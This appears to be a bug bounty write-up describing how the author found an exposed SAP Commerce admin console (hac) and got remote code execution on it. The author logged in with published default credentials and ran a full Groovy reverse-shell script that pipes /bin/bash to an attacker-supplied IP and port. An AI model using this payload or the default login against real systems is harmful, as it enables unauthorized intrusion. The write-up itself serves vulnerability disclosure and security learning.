# How I got Two RCE at BBP Program @0xbartita

- **Source URL:** https://0xbartita.medium.com/how-i-got-two-rce-at-bbp-program-0xbartita-232727c5b3f0?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250621202733/https://0xbartita.medium.com/how-i-got-two-rce-at-bbp-program-0xbartita-232727c5b3f0
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3566 (id 3566)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
How I got Two RCE at BBP Program @0xbartita

Hi all.. 0xbartita

I like to get into the write up directly without any bla bla bla bla.

When I was hunting on BBP bounty program I went to shodan and searched for “ssl:BBP.com” and I got this ip 40.117.\*\*.\*\*\* & Used dirsearch directly I found *http://40.117.\*\*.\*\*\*/hac/login/*

“The hac extension is **the default administration web application of SAP Commerce”.**

I googled for the default credential and I got it from here:

[https://www.cloudnir.com/sap-commerce-cloud-consoles/hybris-administrative-console-hac/](https://www.cloudnir.com/sap-commerce-cloud-consoles/hybris-administrative-console-hac/)

*Username: admin*

*Password: nimda*

And it’s worked i got into the admin panel.

I took a tour on the panel and I found a console Tab ==> *http://40.117.\*\*.\*\*\*/hac/console/scripting/*

As you can see script option is groovy scripting language you can know more about groovy *https://en.wikipedia.org/wiki/Apache\_Groovy*

Then I used this code to get remote code execution

String host=”Your Ip Here”;

int port=Your Port;

String cmd=”/bin/bash”;

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


After I got **RCE** I went to shodan again and searched for more ips & I found the same **hac** application and reported it to the target program

You can find more payloads here *https://coldfusionx.github.io/posts/Groovy\_RCE/*

More groovy payloads → [https://coldfusionx.github.io/posts/Groovy\_RCE/](https://coldfusionx.github.io/posts/Groovy_RCE/)

Twitter → [https://twitter.com/0xBaRtiTa](https://twitter.com/0xBaRtiTa)
